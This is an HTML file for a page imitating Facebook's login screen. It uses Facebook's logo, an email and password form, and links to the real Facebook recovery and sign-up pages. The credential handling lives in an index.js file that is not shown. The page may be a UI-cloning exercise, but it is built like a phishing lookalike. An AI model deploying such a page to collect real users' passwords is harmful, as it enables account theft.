 <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <link rel="stylesheet" href="style.css">
  <link rel="icon" type="png/xml" href="images/icons8-facebook-48.png">
  <script src="index.js"></script>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="images/facebook.svg" alt="Facebook Logo" class="logo">
      <h2>Login to Facebook</h2>
      <form action="#" id="loginForm" method="POST">
        <input type="email" id="email" name="email" placeholder="Email" required>
        <input type="password" id="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
      </form>
      <a href="https://m.facebook.com/login/identify/?">Forgot Password?</a>
      <p class="signup">Don't have an account? <a href="https://www.facebook.com/r.php?locale=en_GB&display=page">Sign up</a></p>
      <p className="facebook-login-terms">
        This site is protected by reCAPTCHA and the Google
        <a href="https://policies.google.com/privacy" class="facebook-login-link">
          Privacy Policy
        </a> 
        and 
        <a href="https://policies.google.com/terms" class="facebook-login-link">
          Terms of Service
        </a> 
        apply.
      </p>
    </div>
  </div>


  <script src="index.js"></script>
</body>
</html>
